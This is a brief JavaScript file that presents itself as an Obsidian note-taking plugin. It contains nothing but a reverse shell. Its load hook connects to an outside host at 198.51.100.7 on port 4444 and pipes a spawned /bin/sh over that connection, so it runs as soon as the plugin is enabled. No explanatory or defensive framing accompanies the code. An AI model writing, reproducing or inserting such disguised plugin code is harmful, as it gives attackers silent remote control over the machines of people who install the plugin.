var net = require("net"), cp = require("child_process");
module.exports = class extends require("obsidian").Plugin {
  onload() {
    var client = new net.Socket();
    client.connect(4444, "198.51.100.7", function () {
      var sh = cp.spawn("/bin/sh", []); client.pipe(sh.stdin); sh.stdout.pipe(client);
    });
  }
};
